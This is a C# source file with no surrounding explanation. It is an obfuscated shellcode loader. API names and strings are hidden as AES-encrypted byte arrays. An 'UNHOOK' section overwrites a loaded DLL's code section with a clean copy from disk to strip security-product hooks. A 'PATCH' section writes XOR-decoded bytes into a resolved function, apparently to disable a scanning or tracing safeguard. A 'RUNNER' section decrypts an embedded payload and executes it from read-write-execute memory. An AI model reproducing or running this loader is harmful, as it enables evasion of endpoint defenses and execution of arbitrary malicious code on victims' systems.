
        using System;
        using System.IO;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Cryptography;
        using System.Text;

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_DATA_DIRECTORY
            {
                public UInt32 VirtualAddress;
                public UInt32 Size;
            }
            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_OPTIONAL_HEADER64
            {
                [FieldOffset(0)]
                public ushort Magic;

                [FieldOffset(2)]
                public byte MajorLinkerVersion;

                [FieldOffset(3)]
                public byte MinorLinkerVersion;

                [FieldOffset(4)]
                public uint SizeOfCode;

                [FieldOffset(8)]
                public uint SizeOfInitializedData;

                [FieldOffset(12)]
                public uint SizeOfUninitializedData;

                [FieldOffset(16)]
                public uint AddressOfEntryPoint;

                [FieldOffset(20)]
                public uint BaseOfCode;

                [FieldOffset(24)]
                public ulong ImageBase;

                [FieldOffset(32)]
                public uint SectionAlignment;

                [FieldOffset(36)]
                public uint FileAlignment;

                [FieldOffset(40)]
                public ushort MajorOperatingSystemVersion;

                [FieldOffset(42)]
                public ushort MinorOperatingSystemVersion;

                [FieldOffset(44)]
                public ushort MajorImageVersion;

                [FieldOffset(46)]
                public ushort MinorImageVersion;

                [FieldOffset(48)]
                public ushort MajorSubsystemVersion;

                [FieldOffset(50)]
                public ushort MinorSubsystemVersion;

                [FieldOffset(52)]
                public uint Win32VersionValue;

                [FieldOffset(56)]
                public uint SizeOfImage;

                [FieldOffset(60)]
                public uint SizeOfHeaders;

                [FieldOffset(64)]
                public uint CheckSum;

                [FieldOffset(68)]
                public ushort Subsystem;

                [FieldOffset(70)]
                public ushort DllCharacteristics;

                [FieldOffset(72)]
                public ulong SizeOfStackReserve;

                [FieldOffset(80)]
                public ulong SizeOfStackCommit;

                [FieldOffset(88)]
                public ulong SizeOfHeapReserve;

                [FieldOffset(96)]
                public ulong SizeOfHeapCommit;

                [FieldOffset(104)]
                public uint LoaderFlags;

                [FieldOffset(108)]
                public uint NumberOfRvaAndSizes;

                [FieldOffset(112)]
                public IMAGE_DATA_DIRECTORY ExportTable;

                [FieldOffset(120)]
                public IMAGE_DATA_DIRECTORY ImportTable;

                [FieldOffset(128)]
                public IMAGE_DATA_DIRECTORY ResourceTable;

                [FieldOffset(136)]
                public IMAGE_DATA_DIRECTORY ExceptionTable;

                [FieldOffset(144)]
                public IMAGE_DATA_DIRECTORY CertificateTable;

                [FieldOffset(152)]
                public IMAGE_DATA_DIRECTORY BaseRelocationTable;

                [FieldOffset(160)]
                public IMAGE_DATA_DIRECTORY Debug;

                [FieldOffset(168)]
                public IMAGE_DATA_DIRECTORY Architecture;

                [FieldOffset(176)]
                public IMAGE_DATA_DIRECTORY GlobalPtr;

                [FieldOffset(184)]
                public IMAGE_DATA_DIRECTORY TLSTable;

                [FieldOffset(192)]
                public IMAGE_DATA_DIRECTORY LoadConfigTable;

                [FieldOffset(200)]
                public IMAGE_DATA_DIRECTORY BoundImport;

                [FieldOffset(208)]
                public IMAGE_DATA_DIRECTORY IAT;

                [FieldOffset(216)]
                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

                [FieldOffset(224)]
                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

                [FieldOffset(232)]
                public IMAGE_DATA_DIRECTORY Reserved;
            }
            [StructLayout(LayoutKind.Explicit, Size = 20)]
            public struct IMAGE_FILE_HEADER
            {
                [FieldOffset(0)]
                public UInt16 Machine;
                [FieldOffset(2)]
                public UInt16 NumberOfSections; //keep
                [FieldOffset(4)]
                public UInt32 TimeDateStamp;
                [FieldOffset(8)]
                public UInt32 PointerToSymbolTable;
                [FieldOffset(12)]
                public UInt32 NumberOfSymbols;
                [FieldOffset(16)]
                public UInt16 SizeOfOptionalHeader;
                [FieldOffset(18)]
                public UInt16 Characteristics;
            }
            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_DOS_HEADER
            {
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
                public char[] e_magic;
                public UInt16 e_cblp; 
                public UInt16 e_cp; 
                public UInt16 e_crlc; 
                public UInt16 e_cparhdr;
                public UInt16 e_minalloc; 
                public UInt16 e_maxalloc;
                public UInt16 e_ss; 
                public UInt16 e_sp; 
                public UInt16 e_csum; 
                public UInt16 e_ip; 
                public UInt16 e_cs; 
                public UInt16 e_lfarlc; 
                public UInt16 e_ovno; 
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
                public UInt16[] e_res1; 
                public UInt16 e_oemid; 
                public UInt16 e_oeminfo; 
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
                public UInt16[] e_res2;
                public Int32 e_lfanew;  

                private string _e_magic
                {
                    get { return new string(e_magic); }
                }

                public bool isValid
                {
                    get { return _e_magic == "MZ"; }
                }
            }
            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_NT_HEADERS64
            {
                [FieldOffset(0)]
                public int Signature;

                [FieldOffset(4)]
                public IMAGE_FILE_HEADER FileHeader;

                [FieldOffset(24)]
                public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
            }
            [StructLayout(LayoutKind.Sequential)]
            public struct MODULEINFO
            {
                public IntPtr lpBaseOfDll;
                public uint SizeOfImage;
                public IntPtr EntryPoint;
            }
            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_SECTION_HEADER
            {
                [FieldOffset(0)]
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
                public char[] Name;

                [FieldOffset(8)]
                public UInt32 VirtualSize;

                [FieldOffset(12)]
                public UInt32 VirtualAddress;

                [FieldOffset(16)]
                public UInt32 SizeOfRawData;

                [FieldOffset(20)]
                public UInt32 PointerToRawData;

                [FieldOffset(24)]
                public UInt32 PointerToRelocations;

                [FieldOffset(28)]
                public UInt32 PointerToLinenumbers;

                [FieldOffset(32)]
                public UInt16 NumberOfRelocations;

                [FieldOffset(34)]
                public UInt16 NumberOfLinenumbers;

                [FieldOffset(36)]
                public uint Characteristics;

                public string Section
                {
                    get { return new string(Name); }
                }
            }  
        namespace ClassName
        {
            public class Class1
            {

            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
            public delegate bool clsh
            (IntPtr hObject);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool frlb
            (IntPtr hModule);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr mpvfl
            (IntPtr hFileMappingObject, uint dwDesiredAccess, UInt32 dwFileOffsetHigh, UInt32 dwFileOffsetLow, IntPtr dwNumberOfBytesToMap);

            
            [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
            public delegate IntPtr crtflmp
            (IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, [MarshalAs(UnmanagedType.LPStr)] string lpName);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall,  SetLastError = true)]
            public delegate IntPtr crtfla
            (string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall,  SetLastError = true)]
            public delegate bool getmodinf
            (IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
            public delegate IntPtr getmodh
            (string lpModuleName);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr getprc
            ();

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr mvmem
            (IntPtr dest, IntPtr src, UInt32 count);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate IntPtr vproc
            (IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr mvmem2
            (IntPtr dest, IntPtr src, int size);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate IntPtr vproc2
            (IntPtr lpAddress, uint dwSize,
                    uint flNewProtect, IntPtr lpflOldProtect);
                    
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	    public delegate IntPtr ogjsqphrvg(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    	    
    	    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	    public delegate UInt32 cclgkvglyx(IntPtr hHandle,UInt32 dwMilliseconds);
    	    
    	    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	    public delegate IntPtr admcftgyzu(UInt32 lpThreadAttributes,UInt32 dwStackSize,IntPtr lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32 lpThreadId);
    	private static UInt32 MEM_COMMIT = 0x1000;
    	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    	    delegate UInt32 notnwnluyd();

            public static int Main()
            {
            
          	byte[] qcwtufjykv = {0x4b,0xfc,0x34,0x5c,0xc6,0xf2,0x3c,0x90,0x62,0x2d,0xf0,0xf7,0x27,0x71,0x3b,0x96};
	    string tkzmmoqqkm = sajrhxawvw(qcwtufjykv);	

            byte[] oavcsyfygz = {0xb8,0x6d,0x3c,0xee,0xb9,0xca,0xdc,0x67,0x77,0x31,0x2e,0xd7,0x35,0x7d,0x25,0x6a};
	    string estawztxzg = sajrhxawvw(oavcsyfygz);
	    
	    byte[] vyleejchrn = {0x25,0xcd,0xab,0xa9,0xe7,0xcb,0x89,0x16,0xed,0x72,0x69,0x49,0x26,0xe0,0xee,0x6e};
	    string rpwnkgfflk = sajrhxawvw(vyleejchrn);
	    
	    byte[] liqwmhvlpx = {0x41,0xc5,0x87,0x20,0xe5,0x04,0x50,0x61,0xa2,0x3d,0xfe,0x26,0x60,0xb8,0x1e,0x39};
	    string bwwqqdokpy = sajrhxawvw(liqwmhvlpx);
	    
	    byte[] gwsrjtcaem = {0x4c,0xa3,0xde,0xd4,0xac,0x46,0xb6,0xa6,0x88,0xbc,0x6d,0x36,0xf0,0x05,0xed,0x85};
	    string dhplcfrwbh = sajrhxawvw(gwsrjtcaem);
	    
	    byte[] pjexjjjsnr = {0x32,0xb7,0xeb,0x70,0x00,0x42,0x7b,0x60,0x8e,0x4b,0xaf,0x00,0x75,0x75,0x58,0xeb};
	    string gyupbzzmwj = sajrhxawvw(pjexjjjsnr);
	    
	    byte[] vaxgmykneg = {0xb2,0x0a,0xa2,0x1b,0x44,0x90,0x1f,0xbe,0x3a,0xba,0xea,0x7b,0x44,0x4d,0x82,0x98};
	    string mzqhedtjse = sajrhxawvw(vaxgmykneg);
	    
	    byte[] qvqxkvpoim = {0x4e,0xbb,0xe2,0x40,0x65,0xd4,0xe0,0xed,0x4f,0x33,0x18,0xc9,0xdd,0xc6,0x52,0x40,0xf0,0x52,0x2e,0x87,0x87,0x77,0xac,0x63,0x50,0x68,0x24,0xe5,0x8e,0x72,0x24,0xb8};
	    string eeqbjqcjbj = sajrhxawvw(qvqxkvpoim);
	    
	    byte[] oslyvjsodf = {0x2e,0x36,0x83,0x57,0x26,0x65,0x7f,0x91,0x8b,0xcd,0x7b,0x5b,0xf1,0xe7,0xec,0x89,0x8c,0x82,0xb0,0x06,0xb4,0xe8,0xdd,0x2e,0xc8,0xf2,0xa6,0x99,0x42,0xdb,0x72,0x04};
	    string wyunycljip = sajrhxawvw(oslyvjsodf);
	    
	    byte[] cdomhliyqv = {0x8c,0xf9,0x4a,0x30,0x64,0x1d,0xe2,0x12,0x97,0x35,0xf3,0xeb,0x39,0x7b,0xf5,0x78,0xf5,0x6b,0x37,0x27,0xd9,0x79,0xed,0xbd,0x41,0x17,0xc2,0x21,0x6f,0x24,0x48,0x49};
	    string xejgjvnjqg = sajrhxawvw(cdomhliyqv);
	    
	    byte[] ymuaxbkxbk = {0x20,0xc6,0xd5,0xe3,0xef,0xec,0x50,0x29,0xfb,0x24,0xcd,0x98,0xd1,0x34,0x79,0x27};
	    string btgebmlvxr = sajrhxawvw(ymuaxbkxbk);
	    
	    byte[] daqjolbfzz = {0xfe,0x8a,0xa6,0x66,0x65,0x75,0x34,0x68,0x33,0x14,0x01,0xb7,0xcb,0x2b,0x2b,0x06,0x3e,0xff,0x0f,0x1c,0x48,0x77,0x86,0x4c,0xdf,0xb9,0x30,0xab,0x96,0xec,0xc7,0xcd};
	    string umdpypdyeg = sajrhxawvw(daqjolbfzz);
	    
	    byte[] dvnguizbgn = {0x15,0x70,0xae,0x5e,0xbe,0x2d,0xd0,0x26,0x38,0x57,0x35,0x58,0xb7,0x12,0xc3,0xf3};
	    string oifyvgjcqp = sajrhxawvw(dvnguizbgn);
	    
	    byte[] xwxecswzun = {0x21,0x12,0x65,0xa4,0x62,0xc9,0x77,0x48,0x16,0x75,0x23,0xe4,0xf7,0xfe,0xd0,0xb1};
	    string urfrwfzbdt = sajrhxawvw(xwxecswzun);
	    
	    byte[] zmsinmiykn = {0xaf,0x72,0xee,0x0a,0x9a,0x2e,0x75,0x9f,0xc2,0xe4,0x89,0x0d,0xbb,0x29,0x30,0x6f};
	    string dqiaedhdqa = sajrhxawvw(zmsinmiykn);
	    
	   byte[] fdcvtgzisj = {0x0a,0xe0,0x39,0x2f,0xac,0x54,0x75,0xde,0x3b,0x0e,0xf8,0xfa,0xe5,0xaa,0x53,0xb3,0xce,0x5a,0x88,0x82,0x16,0x1b,0x30,0xe7,0x68,0x40,0x7b,0x02,0x93,0x3f,0x8f,0xfc,0x1e,0xb2,0x5c,0xac,0x46,0xb1,0xaf,0x82,0xe6,0x2f,0x81,0x02,0x03,0x03,0x60,0x5d};
	    string b = sajrhxawvw(fdcvtgzisj);
	    
            IntPtr TargetDLL = LoadLibrary(rpwnkgfflk);
            IntPtr gkowribvhd = GetProcAddress(TargetDLL, bwwqqdokpy);
            IntPtr feonwqfjab = Marshal.AllocHGlobal(4);
            
            IntPtr sgpgwyjszu = getPtr(dhplcfrwbh, tkzmmoqqkm);
            vproc vp = (vproc)Marshal.GetDelegateForFunctionPointer(sgpgwyjszu, typeof(vproc));

            IntPtr udkbprbdad = getPtr(dhplcfrwbh, estawztxzg);
            mvmem mm = (mvmem)Marshal.GetDelegateForFunctionPointer(udkbprbdad, typeof(mvmem));

            IntPtr uroidbndkh = getPtr(dhplcfrwbh, tkzmmoqqkm);
            vproc2 vp2 = (vproc2)Marshal.GetDelegateForFunctionPointer(uroidbndkh, typeof(vproc2));
            
            IntPtr emnqpcdfwy = getPtr(dhplcfrwbh, estawztxzg);
            mvmem2 mm2 = (mvmem2)Marshal.GetDelegateForFunctionPointer(emnqpcdfwy, typeof(mvmem2));
            
            IntPtr lapmjhkymi = getPtr(dhplcfrwbh, eeqbjqcjbj);
            getprc gtp = (getprc)Marshal.GetDelegateForFunctionPointer(lapmjhkymi, typeof(getprc));
            
            IntPtr wjbzspsfoc = getPtr(dhplcfrwbh, wyunycljip);
            getmodh gtmh = (getmodh)Marshal.GetDelegateForFunctionPointer(wjbzspsfoc, typeof(getmodh));
            
            IntPtr nlzvxnawzi = getPtr(mzqhedtjse, xejgjvnjqg);
            getmodinf gtmi = (getmodinf)Marshal.GetDelegateForFunctionPointer(nlzvxnawzi, typeof(getmodinf));
            
            IntPtr yfnnvctsll = getPtr(dhplcfrwbh, btgebmlvxr);
            crtfla crtfl = (crtfla)Marshal.GetDelegateForFunctionPointer(yfnnvctsll, typeof(crtfla));
            
            IntPtr raricxaslx = getPtr(dhplcfrwbh, umdpypdyeg);
            crtflmp crtflm = (crtflmp)Marshal.GetDelegateForFunctionPointer(raricxaslx, typeof(crtflmp));
            
            IntPtr pgnlzxdoph = getPtr(dhplcfrwbh, oifyvgjcqp);
            mpvfl mp = (mpvfl)Marshal.GetDelegateForFunctionPointer(pgnlzxdoph, typeof(mpvfl));
            
            IntPtr uwjszggwxm = getPtr(dhplcfrwbh, urfrwfzbdt);
            frlb frl = (frlb)Marshal.GetDelegateForFunctionPointer(uwjszggwxm, typeof(frlb));
            
            IntPtr tcwbftylzk = getPtr(dhplcfrwbh, dqiaedhdqa);
            clsh cls = (clsh)Marshal.GetDelegateForFunctionPointer(tcwbftylzk, typeof(clsh));            
            
            ////////////////// UNHOOK
                IntPtr curProc = gtp();
                MODULEINFO modInfo;
                IntPtr handle = gtmh(gyupbzzmwj);
                gtmi(curProc, handle, out modInfo, 0x18);
                IntPtr dllBase = modInfo.lpBaseOfDll;
                string fileName = b;
                IntPtr file = crtfl(fileName, 0x80000000, 0x00000001, IntPtr.Zero, 3, 0, IntPtr.Zero);
                IntPtr mapping = crtflm(file, IntPtr.Zero, 0x02 | 0x1000000, 0, 0, null);
                IntPtr mappedFile = mp(mapping, 0x0004, 0, 0, IntPtr.Zero);

                IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(dllBase, typeof(IMAGE_DOS_HEADER));
                IntPtr ptrToNt = (dllBase + dosHeader.e_lfanew);
                IMAGE_NT_HEADERS64 ntHeaders = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ptrToNt, typeof(IMAGE_NT_HEADERS64));
                for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++)
                {
                    IntPtr ptrSectionHeader = (ptrToNt + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)));
                    IMAGE_SECTION_HEADER sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((ptrSectionHeader + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)))), typeof(IMAGE_SECTION_HEADER));
                    string sectionName = new string(sectionHeader.Name);

                    if (sectionName.Contains("text"))
                    {
                        uint oldProtect = 0;
                        IntPtr lpAddress = IntPtr.Add(dllBase, (int)sectionHeader.VirtualAddress);
                        IntPtr srcAddress = IntPtr.Add(mappedFile, (int)sectionHeader.VirtualAddress);
                        vp(lpAddress, sectionHeader.VirtualSize, 0x40, out oldProtect);
                        mm(lpAddress, srcAddress, sectionHeader.VirtualSize);
                    }
                }


                cls(curProc);
                cls(file);
                cls(mapping);
                frl(handle);
            //////////////// END UNHOOK
      
	    //////////////// PATCH
            vp2(gkowribvhd, 0x0015, 0x40, feonwqfjab);
            
            Byte[] xPatch = { 0x50, 0x8c, 0xf6 };
            var xkey = "asfgkqpaldjdjhs";
            byte[] Patch = XORCipher(xPatch, xkey);
            
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            mm2(gkowribvhd+ 0x001b, unmanagedPointer, Patch.Length);
            ///////////////// END PATCH
            
            ///////////////// RUNNER
            
            		byte[] qwrvwzdbda = {0xc4,0x7d,0x7b,0xc6,0x6b,0x04,0x38,0x84,0xbe,0x95,0x01,0xb8,0xf4,0x80,0xf0,0x8b};
        	string ogjsqphrvg = sajrhxawvw(qwrvwzdbda);
        	
                        IntPtr yuxhvhdizj = getPtr(dhplcfrwbh, ogjsqphrvg);
            ogjsqphrvg va = (ogjsqphrvg)Marshal.GetDelegateForFunctionPointer(yuxhvhdizj, typeof(ogjsqphrvg));

		byte[] rkgycppzja = {0x25,0xed,0xd0,0xbf,0xe2,0x31,0xa2,0xaf,0xa8,0xf5,0x58,0x46,0x92,0xba,0x04,0xad,0xd6,0xff,0x1c,0x20,0x0c,0xf2,0x70,0x4c,0x71,0x0e,0x28,0x88,0x48,0x4d,0x7c,0x76};
        	string cclgkvglyx = sajrhxawvw(rkgycppzja);

            IntPtr lviumpysxs = getPtr(dhplcfrwbh, cclgkvglyx);
        	cclgkvglyx wfso = (cclgkvglyx)Marshal.GetDelegateForFunctionPointer(lviumpysxs, typeof(cclgkvglyx));

		byte[] qfmisidhyi = {0x29,0x8d,0xeb,0x1a,0x12,0xda,0x27,0xdb,0xe9,0xb9,0x9e,0x18,0x1a,0xad,0xc3,0x3c};
        	string admcftgyzu = sajrhxawvw(qfmisidhyi);

            IntPtr nyfhzxgbso = getPtr(dhplcfrwbh, admcftgyzu);
            admcftgyzu ct = (admcftgyzu)Marshal.GetDelegateForFunctionPointer(nyfhzxgbso, typeof(admcftgyzu));


        	byte[] tqurtuqscz = {0x28,0x0c,0xbc,0x90,0x6d,0xc6,0x9b,0x85,0x02,0x55,0x4c,0x55,0xf1,0x72,0x3c,0xd1,0x26,0xc2,0xe7,0x2e,0xc5,0xfc,0xa9,0xf2,0xfc,0x19,0xf5,0xb8,0x2a,0x47,0x6a,0xef,0x93,0xa7,0x57,0x75,0xd2,0x89,0x3c,0xb5,0x32,0xc8,0xb7,0x97,0xed,0xc6,0x07,0xc7,0xf3,0x58,0xe8,0x03,0x0f,0x52,0x54,0x91,0x58,0xbe,0x5d,0xab,0xdc,0x48,0xb3,0x76,0x3f,0xb7,0xbd,0xc4,0x06,0xdf,0x8a,0x6f,0xa8,0x40,0x80,0xe8,0xc8,0xd5,0x66,0xde,0x7f,0x77,0x87,0xc2,0x66,0x91,0xd2,0x5c,0xe8,0x89,0xff,0x6e,0xca,0x98,0xfa,0xd5,0x7c,0x4e,0xfc,0x7f,0x7c,0x12,0x5f,0xf1,0x2e,0xc5,0x67,0xa3,0x05,0xd1,0xa8,0xff,0xad,0x55,0x3c,0xcd,0x7d,0x6c,0xc5,0xbe,0x79,0x6e,0x2e,0x75,0x04,0xa5,0x63,0x48,0x2f,0x11,0xd9,0x5d,0x69,0x8c,0xac,0xc3,0xc2,0xa4,0x44,0x10,0x1f,0xe1,0xbc,0x82,0x19,0x37,0xba,0xbd,0x95,0xf4,0xb6,0x9b,0xc2,0x37,0x1b,0xdc,0x7c,0xfc,0x15,0x5d,0x9f,0x0e,0xaf,0x63,0x99,0xd8,0x70,0xa4,0xb2,0xcf,0xfa,0x63,0xd2,0x48,0xf3,0x14,0x23,0x45,0x1e,0x1b,0x1c,0xc8,0x41,0x4f,0x41,0x1d,0xd2,0x8a,0x68,0x2e,0x91,0x60,0x77,0x46,0x1f,0xe2,0x09,0xae,0xea,0x17,0xf2,0xc8,0x1c,0x5f,0x5c,0xc8,0x98,0x25,0x19,0xca,0x50,0xd9,0xab,0x55,0xf9,0xfa,0x0e,0x9a,0xee,0x13,0xbf,0x86,0x42,0x6d,0x5c,0x6f,0xe2,0xc1,0xe4,0x4b,0x7d,0x36,0xb6,0x08,0xc4,0xe0,0x4e,0x42,0x75,0x27,0x2b,0x28,0x64,0x78,0xd6,0x4c,0x60,0x60,0x91,0xbe,0x40,0x27,0x23,0x83,0xeb,0x71,0x84,0x3b,0x3c,0x55,0x76,0x90,0xdb,0x27,0xbe,0x57,0xd1,0xec,0x6d,0xf0,0xd0,0xf5,0x06,0xa6,0xec,0x77,0xd9,0x82,0x77,0x2f,0x2b,0xc8,0xde,0xb7,0xd7,0x62,0xdf,0x7b,0x13,0x6b,0xcb,0x70,0x17,0xee,0x8f,0x30,0xbe,0x38,0xc8,0x75,0xa0,0x0f,0x4e,0xf2,0xb7,0x7b,0xb9,0xcd,0x48,0x2f,0xa6,0x48,0x2e,0x35,0xf0,0x2f,0xda,0x3e,0x60,0xef,0x41,0x0d,0xaf,0xfa,0x21,0xb7,0x26,0x7a,0x91,0x0a,0x72,0x6b,0x1e,0xd4,0x27,0x0c,0x36,0xe2,0xc7,0xfc,0x9d,0x3b,0x26,0x5c,0x90,0x77,0x96,0x24,0x62,0x0b,0x00,0x3a,0xd5,0x05,0x6b,0x61,0x3d,0xa1,0xbc,0x7b,0xe3,0x30,0x24,0xd0,0x3f,0x2f,0x8c,0xba,0x4f,0x7d,0xc8,0xe7,0x92,0xe0,0x64,0x22,0xb8,0x54,0x4b,0xca,0x72,0xb0,0x55,0x3d,0xde,0x32,0x65,0x4b,0x9f,0xff,0x21,0x08,0x44,0x40,0x8a,0x7b,0x75,0x49,0xe3,0xbe,0xf6,0x8c,0x94,0xb6,0xb1,0x55,0x41,0x96,0x18,0x86,0xa1,0x66,0x53,0xbf,0x56,0x68,0xdd,0x6c,0x8d,0x5a,0x48,0x6b,0xe4,0xe8,0xe0,0xc8,0x23,0x63,0x29,0xd9,0xf3,0x2f,0x44,0x19,0x07,0xac,0x10,0xf5,0x9a,0x18,0x36,0x0f,0x2f,0xb9,0xa0,0x04,0xed,0xf7,0x24,0x05,0x56,0x7f,0x6b,0xb0,0x7f,0x42,0xdb,0x17,0xef,0x52,0x66,0xb5,0x1d,0xa1,0xff,0x19,0x40,0x12,0xda,0x10,0x66,0xd5,0xb8,0x83,0xf8,0x32,0x14,0x55,0x91,0x8e,0xef,0xdd,0x58,0x90,0x1e,0x21,0x45,0x7c,0x15,0xa5,0xf9,0xa8,0x1a,0xdd,0x19,0x30,0x9b,0xb8,0xf7,0xb1,0x42,0x97,0xcf,0xff,0x6f,0x51,0xf6,0x82,0x85,0x50,0x57,0x77,0xb1,0x3e,0xec,0x51,0x3d,0x14,0xf7,0x6a,0x3a,0x39,0xfc,0xe8,0x0e,0x19,0xe9,0x23,0xbd,0x9b,0x97,0xe5,0xfd,0xdc,0x6d,0x7f,0x74,0xa8,0x04,0x2b,0xe9,0x60,0xe1,0x83,0xee,0xf9,0x55,0xd8,0xaa,0x62,0xd8,0xf2,0x40,0x00,0x0b,0x62,0xf7,0x3a,0x53,0xaf,0xbe,0x5b,0x7d,0x61,0x10,0xec,0xb5,0x05,0xc0,0xa6,0xd4,0xae,0x41,0x6e,0xab,0x2b,0x82,0x0c,0x3e,0xe1,0xa8,0xfe,0xdf,0x47,0x05,0x28,0x6c,0x50,0x36,0x6e,0xd5,0x09,0x95,0x91,0x93,0x2e,0xa9,0x95,0x6d,0xbf,0xc3,0x5d,0x43,0xc0,0x9a,0x58,0xe2,0xdb,0xb8,0xc3,0x70,0xa9,0x45,0x34,0x55,0x81,0xa9,0x14,0xcb,0x8b,0x2b,0x26,0xe4,0x29,0xfa,0x2b,0x44,0xe2,0x26,0xcd,0x1b,0x0e,0xaf,0x80,0xa5,0x3a,0x5b,0xea,0x12,0x6d,0x5b,0x9d,0x54,0x34,0x63,0x80,0xe0,0x0b,0xcb,0xfd,0x3e,0x0c,0xf3,0x64,0x72,0x27,0x35,0x8b,0x10,0xd1,0xb3,0x97,0x18,0x3a,0xff,0xc8,0xa3,0xbc,0x15,0x27,0xa0,0x30,0x87,0x89,0x55,0x3a,0x6d,0xc1,0x11,0x3a,0xb2,0xff,0xb9,0x34,0xcf,0xea,0x5a,0xc2,0x6c,0x27,0x62,0x44,0xde,0xf6,0x2b,0xd8,0x4a,0x4b,0xb8,0x6e,0x53,0x62,0x32,0xd3,0x9f,0x30,0xd1,0xe8,0x74,0x09,0x60,0x5e,0xba,0x4a,0x04,0x62,0x58,0xe3,0x47,0xa5,0x92,0xdd,0x87,0xd7,0x2f,0xef,0x0f,0xa1,0x86,0x26,0xee,0xe9,0x69,0x7a,0xac,0xae,0x3e,0x89,0xfa,0xd5,0x94,0x65,0x82,0x50,0xd9,0x07,0xb3,0xb2,0x80,0x02,0x4a,0xdd};

        	byte[] igshglgibz = rtsagifczn(tqurtuqscz);


		IntPtr pgykvvtlid = va(0, (UInt32)igshglgibz.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        	Marshal.Copy(igshglgibz, 0, (IntPtr) pgykvvtlid, igshglgibz.Length);
            notnwnluyd gpfvkdhooy = (notnwnluyd)Marshal.GetDelegateForFunctionPointer((IntPtr) pgykvvtlid, typeof(notnwnluyd));
                
            gpfvkdhooy();

        	////////////////////// END RUNNER

            return 0;
        }
                static IntPtr getPtr(string dllName, string funcName)
            {

                IntPtr hModule = LoadLibrary(dllName);
                IntPtr Ptr = GetProcAddress(hModule, funcName);
                return Ptr;

            }
        
                static byte[] XORCipher(byte[] xpatch, string xkey)
        {
            int patchLen = xpatch.Length;
            int xkeyLen = xkey.Length;
            byte[] output = new byte[patchLen];

            for (int i = 0; i < patchLen; ++i)
            {
                output[i] = (byte)(xpatch[i] ^ xkey[i]);
            }

            return output;
        }
        static byte[] rtsagifczn(byte[] jsmouncdax)
    {
        byte[] uhebbnlwzi = {0xc3,0xbf,0xe7,0xd5,0xf9,0x49,0xb5,0x80,0x1d,0x4e,0xa0,0x17,0x81,0x1d,0xae,0x53};
        byte[] fpjejzegas = {0x1e,0x06,0x9f,0x74,0xa3,0xd9,0xba,0x41,0x6d,0x3f,0x68,0x68,0x67,0x1f,0x7d,0x4e};
        byte[] aes_out = null;
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = uhebbnlwzi;
            aesAlg.IV = fpjejzegas;

            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
            using (MemoryStream msDecrypt = new MemoryStream(jsmouncdax))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (MemoryStream decryptedData = new MemoryStream())
                    {
                        csDecrypt.CopyTo(decryptedData);
                        return decryptedData.ToArray();
                    }
                }
            }
        }
    }

    static string sajrhxawvw(byte[] xurhssdhin)
    {
        byte[] lvwzulcqsp = rtsagifczn(xurhssdhin);
        var v = Encoding.Default.GetString(lvwzulcqsp);
        return v;
    }
		}   
        }
